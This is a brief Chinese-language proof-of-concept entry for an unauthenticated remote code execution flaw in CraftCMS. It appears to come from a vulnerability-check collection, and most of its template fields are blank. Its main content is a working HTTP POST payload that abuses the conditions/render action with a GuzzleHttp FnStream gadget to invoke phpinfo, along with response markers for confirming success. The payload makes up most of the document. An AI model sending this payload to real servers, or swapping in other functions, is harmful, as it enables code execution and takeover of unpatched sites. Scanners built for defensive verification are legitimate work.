﻿# CraftCMS 未授权RCE漏洞复现

> 更新时间：2023-12-04

> 漏洞编号：

> 漏洞说明：

> 漏洞特征：

> 验证脚本：HTTP

```
POST /index.php HTTP/1.1
Content-Type: application/x-www-form-urlencoded

action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
```

> 响应代码特征：200

> 响应内容特征：PHP Version

> 上传文件定位：

> 验证文件来源：CraftCMS 未授权RCE漏洞复现.poc
